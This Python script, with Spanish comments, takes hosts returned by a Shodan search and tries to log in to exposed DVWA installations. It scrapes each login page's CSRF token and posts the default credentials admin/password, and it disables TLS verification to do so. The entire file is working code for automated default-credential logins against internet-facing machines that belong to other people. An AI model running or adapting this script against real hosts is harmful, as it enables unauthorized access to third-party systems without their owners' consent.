import requests
import re


def has_valid_credentials(resultados): # el valor q nos devuelve shodan para cada uno de los resultados
    """verificamos si una instancia de DVWA tiene credenciales por defecto"""
    sesion = requests.Session()
    proto = "https" if "ssl" in resultados else "http"
    login_page = f"{proto}://{resultados['ip_str']}:{resultados['port']}/login.php"

    try:
        res = sesion.get(login_page, verify=False) # No verificamos el cerficado SSL
    except requests.exceptions.RequestException as e:
        print(f"[!] Error al intentar conectarse al host : {resultados['ip_str']}: {e}")
        return False

    if res.status_code != 200:
        print(f"[!] Error en la respuesta del servidor. Respuesta: {res.status_code}")
        return False

    # obtenemos el token CSRF de la página de login
    try: 
        token = re.search(r"user_token' value='([0-9a-f]+)", res.text).group(1) #obtenemos el priemr valor
    except Exception as e:
        print(f"[!] Error al obtener el token CSRF: {e}")
        return False

    res = sesion.post(
        login_page,
        f"username=admin&password=password&user_token={token}&Login=Login",
        allow_redirects=False,
        verify=False,
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )

    # si la res es una redireccion a index.php, significa que el login fue exitoso
    if res.status_code == 302 and res.headers['Location'] == 'index.php':
        return True
    else:
        return False